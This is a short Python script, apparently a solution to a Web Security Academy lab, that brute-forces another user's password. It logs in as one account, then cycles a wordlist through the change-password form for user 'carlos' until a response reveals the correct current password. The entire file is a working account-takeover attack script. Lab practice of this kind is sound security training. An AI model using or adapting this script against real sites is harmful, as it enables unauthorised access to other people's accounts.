import requests

url = "https://0a3f000d0335334e815643b4003d0041.web-security-academy.net/"
creds = {"username":"wiener", "password":"asdf"}
pwds = [line.strip() for line in open("../pass.txt", "r")]
s = requests.session()

def login():
    s.post(url+"login", data=creds)

def try_password(p):
    data = {"username":"carlos", "current-password":p, "new-password-1":"test", "new-password-2":"test"}
    return s.post(url+"my-account/change-password", data=data, allow_redirects=False)

for pwd in pwds:
    login()
    r = try_password(pwd)
    if(r.status_code==200):
        print(pwd)
        break
